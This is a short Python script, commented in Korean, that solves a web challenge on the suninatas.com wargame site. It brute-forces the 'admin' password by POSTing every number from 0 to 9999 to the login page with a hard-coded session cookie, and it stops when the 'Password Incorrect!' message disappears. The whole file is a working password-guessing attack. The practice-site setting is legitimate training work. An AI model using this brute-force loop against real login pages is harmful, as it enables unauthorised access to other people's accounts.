# For 'http://suninatas.com/challenge/web08/web08.asp'

import urllib.request       # HTTP 요청 기능을 담은 모듈
import urllib.parse         # URL 해석, 조작 기능을 담은 모듈

url = 'http://suninatas.com/challenge/web08/web08.asp'
cookie = {'Cookie' : 'ASPSESSIONIDQCTATBDQ=LCHNKAAAEHJBIDOGHAKHCAOK'}    # document.cookie

def submit(value):
    post_data = {'id' : 'admin', 'pw' : value}  # tuple
    post_data = urllib.parse.urlencode(post_data)   # tuple을 POST 방식으로 전송하기 위한 데이터로 변환
    post_data = post_data.encode()  # Unicode를 문자열로 변환

    request = urllib.request.Request(url, headers=cookie)   # URL 요청 인스턴트화
    response = urllib.request.urlopen(request, post_data).read()    # URL을 열고, 받아온 데이터를 byte형으로 반환 
    response = response.decode()    # 문자열을 Unicode로 변환

    print("Try value : ", value)
    
    if response.find('Password Incorrect!') < 0:
        return 1
    
    return 0

if __name__=="__main__":
    for password in range(10000) :  # Password in 0 ~ 9999
        if submit(password) == 1:
            print("Password is ", password)
            break

